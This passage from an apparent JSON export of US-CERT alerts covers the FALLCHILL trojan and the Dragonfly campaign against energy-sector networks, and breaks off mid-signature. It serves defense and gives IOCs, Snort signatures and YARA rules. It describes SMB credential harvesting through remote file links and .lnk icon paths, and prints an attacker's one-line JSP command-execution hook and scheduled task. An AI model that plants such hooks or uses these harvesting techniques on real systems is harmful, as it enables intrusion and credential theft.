href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.csv\">.csv</a>)</li><li>IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/TA-17-318A-IOCs.xml\">.stix</a>)</li></ul><p>NCCIC conducted analysis on two samples of FALLCHILL malware and produced a Malware Analysis Report (MAR). MAR-10135536-A examines the tactics, techniques, and procedures observed in the malware. For a downloadable copy of the MAR, see:</p><ul><li>MAR (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_S508C.pdf\">.pdf</a>)</li><li>MAR IOCs (<a href=\"https://www.us-cert.gov/sites/default/files/publications/MAR-10135536-A_WHITE_stix.xml\">.stix</a>)</li></ul>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>According to trusted third-party reporting, HIDDEN COBRA actors have likely been using FALLCHILL malware since 2016 to target the aerospace, telecommunications, and finance industries. The malware is a fully functional RAT with multiple commands that the actors can issue from a command and control (C2) server to a victim’s system via dual proxies. FALLCHILL typically infects a system as a file dropped by other HIDDEN COBRA malware or as a file downloaded unknowingly by users when visiting sites compromised by HIDDEN COBRA actors. HIDDEN COBRA actors use an external tool or dropper to install the FALLCHILL malware-as-a-service to establish persistence. Because of this, additional HIDDEN COBRA malware may be present on systems compromised with FALLCHILL.</p><p>During analysis of the infrastructure used by FALLCHILL malware, the U.S. Government identified 83 network nodes. Additionally, using publicly available registration information, the U.S. Government identified the countries in which the infected IP addresses are registered.</p><h3><strong>Technical Details</strong></h3><p>FALLCHILL is the primary component of a C2 infrastructure that uses multiple proxies to obfuscate network traffic between HIDDEN COBRA actors and a victim’s system. According to trusted third-party reporting, communication flows from the victim’s system to HIDDEN COBRA actors using a series of proxies as shown in figure 1.</p><p><img alt=\"HIDDEN COBRA Communication Flow\" src=\"https://www.us-cert.gov/sites/default/files/publications/alert-graphic-01.png\" style=\"width: 786px; height: 191px;\" /></p><h5>Figure 1. HIDDEN COBRA Communication Flow</h5><p>FALLCHILL uses fake Transport Layer Security (TLS) communications, encoding the data with RC4 encryption with the following key: [0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00 03 82]. FALLCHILL collects basic system information and beacons the following to the C2:</p><ul><li>operating system (OS) version information,</li><li>processor information,</li><li>system name,</li><li>local IP address information,</li><li>unique generated ID, and</li><li>media access control (MAC) address.</li></ul><p>FALLCHILL contains the following built-in functions for remote operations that provide various capabilities on a victim’s system:</p><ul><li>retrieve information about all installed disks, including the disk type and the amount of free space on the disk;</li><li>create, start, and terminate a new process and its primary thread;</li><li>search, read, write, move, and execute files;</li><li>get and modify file or directory timestamps;</li><li>change the current directory for a process or file; and</li><li>delete malware and artifacts associated with the malware from the infected system.</li></ul><h3>Detection and Response</h3><p>This alert’s IOC files provide HIDDEN COBRA indicators related to FALLCHILL. DHS and FBI recommend that network administrators review the information provided, identify whether any of the provided IP addresses fall within their organizations’ allocated IP address space, and—if found—take necessary measures to remove the malware.</p><p>When reviewing network perimeter logs for the IP addresses, organizations may find instances of these IP addresses attempting to connect to their systems. Upon reviewing the traffic from these IP addresses, system owners may find some traffic relates to malicious activity and some traffic relates to legitimate activity.</p><h3>Network Signatures and Host-Based Rules</h3><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with HIDDEN COBRA actors. Although created using a comprehensive vetting process, the possibility of false positives always remains. These signatures and rules should be used to supplement analysis and should not be used as a sole source of attributing this activity to HIDDEN COBRA actors.</p><h4>Network Signatures</h4><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 01 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x04\\x88\\x4d\\x76/\"; rev:1; sid:2;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 02 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\x06\\x88\\x4d\\x76/\"; rev:1; sid:3;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 03 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb2\\x63\\x70\\x7b/\"; rev:1; sid:4;)</code></p><p>___________________________________________________________________________________________</p><p><code>alert tcp any any -&gt; any any (msg:\"Malicious SSL 04 Detected\";content:\"|17 03 01 00 08|\";  pcre:\"/\\x17\\x03\\x01\\x00\\x08.{4}\\xb0\\x63\\x70\\x7b/\"; rev:1; sid:5;)</code></p><div>___________________________________________________________________________________________</div><h4>YARA Rules</h4><p>The following rules were provided to NCCIC by a trusted third party for the purpose of assisting in the identification of malware associated with this alert.</p><p>THIS DHS/NCCIC MATERIAL IS FURNISHED ON AN “AS-IS” BASIS.  These rules have been tested and determined to function effectively in a lab environment, but we have no way of knowing if they may function differently in a production network.  Anyone using these rules are encouraged to test them using a data set representitive of their environment.</p><p><code>rule rc4_stack_key_fallchill<br />{<br />meta:<br />    description = \"rc4_stack_key\"<br />strings:<br />    $stack_key = { 0d 06 09 2a ?? ?? ?? ?? 86 48 86 f7 ?? ?? ?? ?? 0d 01 01 01 ?? ?? ?? ?? 05 00 03 82 41 8b c9 41 8b d1 49 8b 40 08 48 ff c2 88 4c 02 ff ff c1 81 f9 00 01 00 00 7c eb }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and $stack_key<br />}</code></p><p><code>rule success_fail_codes_fallchill</code></p><p><code>{<br />meta:<br />    description = \"success_fail_codes\"<br />strings:<br />    $s0 = { 68 7a 34 12 00 }  <br />    $s1 = { ba 7a 34 12 00 }  <br />    $f0 = { 68 5c 34 12 00 }  <br />    $f1 = { ba 5c 34 12 00 }<br />condition:<br />    (uint16(0) == 0x5A4D and uint16(uint32(0x3c)) == 0x4550) and (($s0 and $f0) or ($s1 and $f1))<br />}</code></p><p>___________________________________________________________________________________________</p>\t\t\n\t\t<h3>Impact</h3>\n\t\t<p>A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:</p><ul><li>temporary or permanent loss of sensitive or proprietary information,</li><li>disruption to regular operations,</li><li>financial losses incurred to restore systems and files, and</li><li>potential harm to an organization’s reputation.</li></ul>\t\t\n\t\t<h3>Solution</h3>\n\t\t<h4><strong><em>Mitigation Strategies</em></strong></h4><p>DHS recommends that users and administrators use the following best practices as preventive measures to protect their computer networks:</p><ul><li>Use application whitelisting to help prevent malicious software and unapproved programs from running. Application whitelisting is one of the best security strategies as it allows only specified programs to run, while blocking all others, including malicious software.</li><li>Keep operating systems and software up-to-date with the latest patches. Vulnerable applications and operating systems are the target of most attacks. Patching with the latest updates greatly reduces the number of exploitable entry points available to an attacker.</li><li>Maintain up-to-date antivirus software, and scan all software downloaded from the Internet before executing.</li><li>Restrict users’ abilities (permissions) to install and run unwanted software applications, and apply the principle of “least privilege” to all systems and services. Restricting these privileges may prevent malware from running or limit its capability to spread through the network.</li><li>Avoid enabling macros from email attachments. If a user opens the attachment and enables macros, embedded code will execute the malware on the machine. For enterprises or organizations, it may be best to block email messages with attachments from suspicious sources. For information on safely handling email attachments, see <a href=\"https://www.us-cert.gov/sites/default/files/publications/emailscams_0905.pdf\">Recognizing and Avoiding Email Scams</a>. Follow safe practices when browsing the web. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-003\">Good Security Habits</a> and <a href=\"https://www.us-cert.gov/ncas/tips/ST06-008\">Safeguarding Your Data</a> for additional details.</li><li>Do not follow unsolicited web links in emails. See <a href=\"https://www.us-cert.gov/ncas/tips/ST04-014\">Avoiding Social Engineering and Phishing Attacks</a> for more information.</li></ul><h4><strong><em>Response to Unauthorized Network Access</em></strong></h4><ul><li><strong>Contact DHS or your local FBI office immediately.</strong> To report an intrusion and request resources for incident response or technical assistance, contact DHS NCCIC (<a href=\"https://www.us-cert.govmailto:NCCICCustomerService@hq.dhs.gov\">NCCICCustomerService@hq.dhs.gov</a> or 888-282-0870), FBI through a local field office, or the FBI’s Cyber Division (<a href=\"https://www.us-cert.govmailto:CyWatch@fbi.gov\">CyWatch@fbi.gov</a> or 855-292-3937).</li></ul><p> </p>\t\t\n\t\t<h3>References</h3>\n\t\t<ul>\n\t\t\t\t</ul>\n\t\t\n\t\t<h3>Revision History</h3>\n\t\t<ul>\n\t\t\t\t\t<li>November 14, 2017: Initial version</li>\n\t\t\t\t\t</ul>\n\t\t<hr />\n\t\t<p>This product is provided subject to this <a href=\"http://www.us-cert.gov/privacy/notification\">Notification</a> and this <a href=\"http://www.us-cert.gov/privacy/\">Privacy &amp; Use</a> policy.</p>\t\t<br />"
				}
			],
			"created_by_ref": "US-CERT",
			"created": "2017-11-14T18:09:27.000Z"
		},
		{
			"type": "report",
			"title": "TA17-293A: Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors",
			"name": "TA17-293A: Advanced Persistent Threat Activity Targeting Energy and Other Critical Infrastructure Sectors",
			"id": "report-11cf6796-607a-47cd-9dec-5abf0249d848",
			"description": "Original release date: October 20, 2017 | Last revised: October 23, 2017<br />\n\t\t<h3>Systems Affected</h3>\n\t\t<ul><li>Domain Controllers</li><li>File Servers</li><li>Email Servers</li></ul>\t\t\n\t\t<h3>Overview</h3>\n\t\t<p>This joint Technical Alert (TA) is the result of analytic efforts between the Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI). This alert provides information on advanced persistent threat (APT) actions targeting government entities and organizations in the energy, nuclear, water, aviation, and critical manufacturing sectors. Working with U.S. and international partners, DHS and FBI identified victims in these sectors. This report contains indicators of compromise (IOCs) and technical details on the tactics, techniques, and procedures (TTPs) used by APT actors on compromised victims’ networks.</p><p>DHS assesses this activity as a multi-stage intrusion campaign by threat actors targeting low security and small networks to gain access and move laterally to networks of major, high value asset owners within the energy sector. Based on malware analysis and observed IOCs, DHS has confidence that this campaign is still ongoing, and threat actors are actively pursuing their ultimate objectives over a long-term campaign. The intent of this product is to educate network defenders and enable them to identify and reduce exposure to malicious activity.</p><p>For a downloadable copy of IOC packages and associated files, see:</p><ul><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A_TLP_WHITE_CSV.csv\">TA17-293A_TLP_WHITE.csv</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20_TLP_%20WHITE.xml\">TA17-293A_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">MIFR-10127623_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE_stix.xml\">MIFR-10127623_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE.pdf\">MIFR-10128327_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128327_TLP_WHITE_stix.xml\">MIFR-10128327_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE.pdf\">MIFR-10128336_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128336_TLP_WHITE_stix.xml\">MIFR-10128336_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE.pdf\">MIFR-10128830­_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128830_TLP_WHITE_stix.xml\">MIFR-10128830­_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE.pdf\">MIFR-10128883_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10128883_TLP_WHITE_stix.xml\">MIFR-10128883_TLP_WHITE_stix.xml</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE.pdf\">MIFR-10135300_TLP_WHITE.pdf</a></li><li><a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10135300_TLP_WHITE_stix.xml\">MIFR-10135300_TLP_WHITE_stix.xml</a></li></ul><p>Contact DHS or law enforcement immediately to report an intrusion and to request incident response resources or technical assistance.</p>\t\t\n\t\t<h3>Description</h3>\n\t\t<p>Since at least May 2017, threat actors have targeted government entities and the energy, water, aviation, nuclear, and critical manufacturing sectors, and, in some cases, have leveraged their capabilities to compromise victims’ networks. Historically, cyber threat actors have targeted the energy sector with various results, ranging from cyber espionage to the ability to disrupt energy systems in the event of a hostile conflict. [1] Historically, threat actors have also targeted other critical infrastructure sectors with similar campaigns.</p><p>Analysis by DHS, FBI, and trusted partners has identified distinct indicators and behaviors related to this activity. Of specific note, the report Dragonfly: Western energy sector targeted by sophisticated attack group, released by Symantec on September 6, 2017, provides additional information about this ongoing campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[2]</a></p><p>This campaign comprises two distinct categories of victims: staging and intended targets. The initial victims are peripheral organizations such as trusted third party suppliers with less secure networks. The initial victims are referred to as “staging targets” throughout this alert. The threat actor uses the staging targets’ networks as pivot points and malware repositories when targeting their final intended victims. The ultimate objective of the cyber threat actors is to compromise organizational networks, which are referred throughout this alert as “intended target.”</p><h4>Technical Details</h4><p>The threat actors in this campaign employed a variety of TTPs, including:</p><ul><li>open-source reconnaissance,</li><li>spear-phishing emails (from compromised legitimate accounts),</li><li>watering-hole domains,</li><li>host-based exploitation,</li><li>industrial control system (ICS) infrastructure targeting, and</li><li>ongoing credential gathering.</li></ul><h4>Using Cyber Kill Chain for Analysis</h4><p>DHS leveraged the Cyber Kill Chain model to analyze, discuss, and dissect malicious cyber activity. Phases of the model include reconnaissance, weaponization, delivery, exploitation, installation, command and control, and actions on the objective. This section will provide a high-level overview of activity within this framework.</p><p><strong>Stage 1: Reconnaissance</strong></p><p>The threat actors appear to have deliberately chosen the organizations they targeted, rather than pursuing them as targets of opportunity. Staging targets held preexisting relationships with many of the intended targets. It is known that threat actors are actively accessing publicly available information hosted by organization-monitored networks. DHS further assesses that threat actors are seeking to identify information pertaining to network and organizational design, as well as control system capabilities, within organizations.</p><p>Forensic analysis identified that threat actors are conducting open-source reconnaissance of their targets, gathering information posted on company-controlled websites. This is a common tactic for collecting the information needed for targeted spear-phishing attempts. In some cases, information posted to company websites, especially information that may appear to be innocuous, may contain operationally sensitive information. As an example, the threat actors downloaded a small photo from a publically accessible human resources page. The image, when expanded, was a high-resolution photo that displayed control systems equipment models and status information in the background.</p><p>Analysis also revealed that the threat actors used compromised staging target networks to conduct open-source reconnaissance to identify potential targets of interest and intended targets. “Targets of interest” refers to organizations that DHS observed the threat actors showing an active interest in, but where no compromise was reported. Specifically, the threat actors accessed publically web-based remote access infrastructure such as websites, remote email access portals, and virtual private network (VPN) connections.</p><p><strong>Stage 2: Weaponization</strong></p><h5>Spear-Phishing Email TTPs</h5><p>Throughout the spear-phishing campaign, threat actors used email attachments to leverage legitimate Microsoft Office functions to retrieve a document from a remote server using the Server Message Block (SMB) protocol. (An example of this request is: file[:]//&lt;remote IP address&gt;/Normal.dotm). As a part of the standard processes executed by Microsoft Word, this request authenticates the client with the server, sending the user’s credential hash to the remote server prior to retrieving the requested file. (Note: It is not necessary for the file to be retrieved for the transfer of credentials to occur.) The threat actors then likely used password-cracking techniques to obtain the plaintext password. Once actors obtain valid credentials, they are able to masquerade as authorized users.</p><p><strong>Stage 3: Delivery</strong></p><p>When seeking to compromise the target network, threat actors used a spear-phishing email campaign that differed from previously reported TTPs. The spear-phishing email used a generic contract agreement theme, with the subject line “AGREEMENT &amp; Confidential”, and which contained a generic PDF document, titled “’’document.pdf”. (Note the inclusion of two single apostrophes at the beginning of the attachment name.) The PDF itself was not malicious and did not contain any active code. The document prompted the user to click on a link should a download not automatically begin. (Note: No code within the PDF initiated a download.) The link directs users to a website via a shortened URL, which may prompt them to retrieve a malicious file.</p><p>In previous reporting, DHS and FBI identified the common themes used in these spear-phishing emails, all emails referred to control systems or process control systems. The threat actors continue to use these themes, specifically against intended target organizations. Email messages include references to common industrial control equipment and protocols. The emails leveraged malicious Microsoft Word attachments that appear to be legitimate résumés or curricula vitae (CVs) for industrial control systems personnel, as well as invitations and policy documents that entice the user to open the attachment. The list of file names has been published in the IOC.</p><p><strong>Stage 4: Exploitation</strong></p><p>Threat actors used distinct and unusual TTPs (i.e., successive redirects) in the phishing campaign directed at staging targets. Emails contained a stacked URL-shortening link that directed the user to http://bit[.]ly/2m0x8IH link, which redirected the user to http://tinyurl[.]com/h3sdqck link, which redirected the user to the ultimate destination of http://imageliners[.]com/nitel. The imageliner[.]com website contained an email address and password input fields mimicking a login page for a website.</p><p>When exploiting the intended targets, threat actors used malicious .docx files to capture user credentials, however, DHS did not observe the actors establishing persistence on the user’s system. The documents attempt to retrieve a file through a “file:\\\\” connection over SMB using Transmission Control Protocol (TCP) ports 445 or 139 and User Datagram Protocol (UDP) ports 137 or 138. This connection is made to a command and control (C2) server — either a server owned by the threat actors or that of a compromised system owned by a staging location victim. When a user is authenticated as a domain user, this will provide the C2 server with the hash of the victim. Local users will receive a graphical user interface (GUI) prompt to enter a username and password. This information will be provided to the C2 over TCP ports 445 or 139 and UDP ports 137 or 138. (Note: A file transfer is not necessary for a loss of credential information.) Symantec’s report associates this behavior to the Dragonfly threat actors in this campaign. <a href=\"https://www.symantec.com/connect/blogs/dragonfly-western-energy-sector-targeted-sophisticated-attack-group\">[3]</a></p><h5><strong>Use of Watering Hole Domains</strong></h5><p>One of the threat actors’ primary uses for staging targets is to develop watering holes. The threat actors compromise the infrastructure of trusted organizations to reach intended targets. [4] Although these watering holes may host legitimate content by reputable organizations, the threat actors have altered them to contain and reference malicious content. Approximately half of the known watering holes are trade publications and informational websites related to process control, ICS, or critical infrastructure.</p><p>Using a similar SMB collection technique, the actors manipulated these websites by altering JavaScript and PHP files that redirect to an IP address on port 445 for credential harvesting. The compromised sites include both custom developed web applications and template-based frameworks. The threat actors injected a line of code into header.php, a legitimate PHP file that carried out the redirected traffic.</p><p>There is no indication that threat actors used zero-day exploits to manipulate the sites; the threat actors more likely used legitimate credentials to access the website content directly.</p><p><strong>Stage 5: Installation</strong></p><p>The threat actors leveraged compromised credentials to access victims’ networks where multi-factor authentication is not used. <a href=\"https://www.us-cert.gov/sites/default/files/publications/MIFR-10127623_TLP_WHITE.pdf\">[5]</a> Once inside of an intended target’s network, the threat actors downloaded tools from a remote server. The initial versions of the file names contained .txt extensions and were renamed to the appropriate extension, typically .exe or .zip.</p><p>In one example, after gaining remote access to the network of an intended victim, the threat actor carried out the following actions:</p><ul><li>The threat actor connected to 91.183.104[.]150 and downloaded multiple files, specifically the file INST.txt.</li><li>The files were renamed to new extensions, with INST.txt being renamed INST.exe.</li><li>The files were executed on the host and then immediately deleted.</li><li>The execution of INST.exe triggered a download of ntdll.exe, and shortly after, ntdll.exe appeared in the running process list of a compromised system of an intended target.</li></ul><p>In their report on Dragonfly, Symantec associated the MD5 hash of INST.exe to Backdoor.Goodor. The MD5 hashes for the previously mentioned files can be found in the IOC list above.</p><p>Several of these files were scripts that were used for creating the initial account leveraged by the threat actors. The initial script symantec_help.jsp contained a one-line reference to a malicious script. It was located at C:\\Program Files (x86)\\Symantec\\Symantec Endpoint Protection Manager\\tomcat\\webapps\\ROOT\\.</p><p><strong>Contents of symantec_help.jsp</strong></p><p>____________________________________________________________________________________________________________________</p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;% Runtime.getRuntime().exec(\"cmd /C \\\"\" + System.getProperty(\"user.dir\") + \"\\\\..\\\\webapps\\\\ROOT\\\\&lt;REDACTED SCRIPT NAME&gt;\\\"\"); %&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>The malicious script created a user account, disabled the host-based firewall, and globally opened port 3389 for Remote Desktop Protocol (RDP) access. The script then attempted to add the newly created account to the administrators group for elevated privileges. This script contained hard-coded values for the group name “administrator” in Spanish, Italian, German, French, and English.</p><p>In addition, the threat actors also created a scheduled task “reset”, which was designed to automatically log out of their newly created account every eight hours.</p><p><strong>Contents of Scheduled Task</strong></p><p><strong>____________________________________________________________________________________________________________________</strong></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\" style=\"width: 100%;\"><tbody><tr><td><p>&lt;?xml version=\"1.0\" encoding=\"UTF-16\"?&gt;</p><p>&lt;Task version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"&gt;</p><p> &lt;RegistrationInfo&gt;</p><p>  &lt;Date&gt;2017-06-25T11:51:17.4848488&lt;/Date&gt;</p><p>  &lt;Author&gt;&lt;REDACTED&gt;&lt;/Author&gt;</p><p> &lt;/RegistrationInfo&gt;</p><p> &lt;Triggers&gt;</p><p>  &lt;TimeTrigger&gt;</p><p>   &lt;StartBoundary&gt;2017-06-25T12:30:29&lt;/StartBoundary&gt;</p><p>   &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;/TimeTrigger&gt;</p><p> &lt;/Triggers&gt;</p><p> &lt;Principals&gt;</p><p>  &lt;Principal id=\"Author\"&gt;</p><p>   &lt;RunLevel&gt;LeastPrivilege&lt;/RunLevel&gt;</p><p>   &lt;UserId&gt;&lt;REDACTED USERNAME&gt;&lt;/UserId&gt;</p><p>   &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</p><p>  &lt;/Principal&gt;</p><p> &lt;/Principals&gt;</p><p> &lt;Settings&gt;</p><p>  &lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;</p><p>  &lt;DisallowStartIfOnBatteries&gt;true&lt;/DisallowStartIfOnBatteries&gt;</p><p>  &lt;StopIfGoingOnBatteries&gt;true&lt;/StopIfGoingOnBatteries&gt;</p><p>  &lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;</p><p>  &lt;StartWhenAvailable&gt;false&lt;/StartWhenAvailable&gt;</p><p>  &lt;RunOnlyIfNetworkAvailable&gt;false&lt;/RunOnlyIfNetworkAvailable&gt;</p><p>  &lt;IdleSettings&gt;</p><p>   &lt;StopOnIdleEnd&gt;true&lt;/StopOnIdleEnd&gt;</p><p>   &lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;</p><p>  &lt;/IdleSettings&gt;</p><p>  &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;</p><p>  &lt;Enabled&gt;true&lt;/Enabled&gt;</p><p>  &lt;Hidden&gt;false&lt;/Hidden&gt;</p><p>  &lt;RunOnlyIfIdle&gt;false&lt;/RunOnlyIfIdle&gt;</p><p>  &lt;WakeToRun&gt;false&lt;/WakeToRun&gt;</p><p>  &lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;</p><p>  &lt;Priority&gt;7&lt;/Priority&gt;</p><p> &lt;/Settings&gt;</p><p> &lt;Actions Context=\"Author\"&gt;</p><p>  &lt;Exec&gt;</p><p>   &lt;Command&gt;logoff&lt;/Command&gt;</p><p>  &lt;/Exec&gt;</p><p> &lt;/Actions&gt;</p><p>&lt;/Task&gt;</p></td></tr></tbody></table><p>____________________________________________________________________________________________________________________</p><p>After achieving access to staging targets, the threat actors installed tools to carry out their mission. On one occasion, threat actors installed the free version of Forticlient, which was presumably used as a VPN client for intended targets.</p><p>Consistent with the perceived goal of credential harvesting, the threat actor was observed dropping and executing open source and free tools such as Hydra, SecretsDump, and CrackMapExec. The naming convention and download locations suggest that these files were downloaded directly from publically available locations such as GitHub. Forensic analysis indicates that many of these tools were executed during the timeframe in which the threat actor was accessing the system. Of note, the threat actor installed Python 2.7 on a compromised host of one staging victim, and a Python script was seen at C:\\Users\\&lt;Redacted Username&gt;\\Desktop\\OWAExchange\\. In the previous folder structure, a subfolder named “out” held multiple text files.</p><h5>Persistence Through .LNK File Manipulation</h5><p>The threat actors manipulated .lnk files to repeatedly gather user credentials. Default Windows functionality enables icons to be loaded from a local Windows repository. The threat actors exploited this built-in Windows functionality by setting the icon path to their remote controlled server. When the user browses to the directory, Windows attempts to load the icon and initiate an SMB authentication session. During this process, the active user’s credentials are passed through the attempted SMB connection. The threat actors used this tactic in both Virtual Desktop Infrastructure (VDI) and traditional environments.</p><p><img alt=\"Parsed output for file: SETROUTE.lnk\" src=\"https://www.us-cert.gov/sites/default/files/publications/TA17-293A%20Image1.png\" style=\"width: 543px; height: 502px; float: left;\" /></p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p> </p><p>Three of the observed .lnk files were SETROUTE.lnk, notepad.exe.lnk, and Document.lnk. These names appear to be contextual, and threat actors may use a variety of other file names within this tactic. Two of the remote servers observed in these .lnk files were 62.8.193[.]206 and 5.153.58[.]45.</p><h5>Establishing Local Accounts</h5><p>The threat actors created accounts on the staging target for ongoing operations. These accounts, masquerading as legitimate service accounts, appeared to be tailored to each individual staging target. Each account created by the threat actors served a specific purpose in their operation. DHS and FBI identified the creation of four local accounts on a compromised server. The server operated as both a domain controller and an email server for a staging target.</p><p><strong>Account 1:</strong> The threat actors created a local account, which was named to mimic backup services of the staging target. This account was created by the aforementioned malicious script. The threat actors used this account to conduct open-source reconnaissance and remotely access intended targets. This account was also used to remove the Forticlient software.</p><p><strong>Account 2:</strong> Account 1 was used to create Account 2 to impersonate an email administration account. The only observed action was to create Account 3.</p><p><strong>Account 3:</strong> The threat actors created Account 3 in the staging victim’s Microsoft Exchange Server. A PowerShell script created this account during an RDP session while the threat actor was authenticated as Account 2. The naming conventions of the created Microsoft Exchange account followed that of the staging target (e.g., first initial concatenated with the last name).</p><p><strong>Account 4:</strong> In the latter stage of the compromise, the threat actor used Account 1 to create Account 4, a local administrator account. Account 4 was then used to delete the following logs: system, security, terminal services, remote services, and audit. Registry analysis indicated that this activity was likely scripted.</p><p><strong>Stage 6: Command and Control</strong></p><p>The threat actors commonly use web shells to compromise publically available servers to gain a foothold into internal networks. This activity has been observed on both web and email servers. The threat actors then establish an encrypted connection over port 443 to the web shell. Once connected, the threat actors download additional malicious files from the threat actors’ servers to the publically available server. Two of the web shells (AutoDiscover.aspx and global.aspx) used by the actors are detailed in the accompanying IOC list. Despite having different file names, the MD5 hashes of the two web shells indicated that the two files were the same file. These web shells have been associated with the ciklon_z webshell.</p><p>DHS and FBI identified the threat actors leveraging remote access services and infrastructure, such as VPN, RDP, and Outlook Web Access (OWA). The threat actors used staging targets to connect to several intended targets, effectively turning the staging targets into command and control points. To date, it is presumed that the threat actors have targeted services that use single-factor authentication. DHS believes that the threat actors employ this methodology to avoid detection and attribution.</p><h5>Targeting of ICS and SCADA Infrastructure</h5><p>Upon gaining access to intended victims, the threat actors conducted reconnaissance operations within the network. Specifically, the threat actors focused on identifying and browsing file servers within the intended victim’s network. The threat actors viewed files pertaining to ICS or Supervisory Control and Data Acquisition (SCADA) systems. Based on DHS analysis of existing compromises, these files were originally named containing ICS vendor names and ICS reference documents pertaining to the organization (e.g., “SCADA WIRING DIAGRAM.pdf” or “SCADA PANEL LAYOUTS.xlsx”).</p><p>In one instance, the threat actors accessed workstations and servers on a corporate network that contained data output from control systems within energy generation facilities. In this same incident, the threat actors created a malicious scheduled task that invoked “scr.exe” with the arguments “scr.jpg”. The MD5 hash of scr.exe matched the MD5 of ScreenUtil, a tool used by the threat actor, as reported in the Symantec Dragonfly 2.0 report.</p><h4>Detection and Response</h4><p>IOCs related to this campaign are provided within the accompanying .csv and .stix files of this alert. DHS and FBI recommend that network administrators review the IP addresses, domain names, file hashes, network signatures, and YARA rules provided and add the IPs to their watchlist to determine whether malicious activity has been observed within their organization. System owners are also advised to run the YARA tool on any system suspected to have been targeted by these APT actors.</p><h5>Network Signatures and Host-Based Rules</h5><p>This section contains network signatures and host-based rules that can be used to detect malicious activity associated with threat actors TTPs. Although these network signatures and host-based rules were created using a comprehensive vetting process, the possibility of false positives always remains.</p><h5>Network Signatures</h5><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/aspnet_client/system_web/4_0_30319/update/' (Beacon)\"; sid:42000000; rev:1; flow:established,to_server; content:\"/aspnet_client/system_web/4_0_30319/update/\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</code></p><p><code>___________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/img/bson021.dat'\"; sid:42000001; rev:1; flow:established,to_server; content:\"/img/bson021.dat\"; http_uri; fast_pattern:only; classtype:bad-unknown; metadata:service http;)</code></p><p><code>________________________________________</code></p><p><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:\"HTTP URI contains '/A56WY' (Callback)\"; sid:42000002; rev:1; flow:established,to_server; content:\"/A56WY\"; http_uri; fast_pattern; classtype:bad-unknown; metadata:service http;)</code></p><p><code>_________________________________________</code></p><p><code>alert tcp any any -&gt; any 445 (msg:\"SMB Client Request contains 'AME_ICON.PNG' (SMB credential harvesting)\"; sid:42000003; rev:1; flow:established,to_server; content:\"|FF|SMB|75 00 00 00 00|\"; offset:4; depth:9; content:\"|08 00 01 00|\"; distance:3; content:\"|00 5c 5c|\"; distance:2; within:3; content:\"|5c|AME_ICON.PNG\"; distance:7; fast_pattern; classtype:bad-unknown; metadata:service 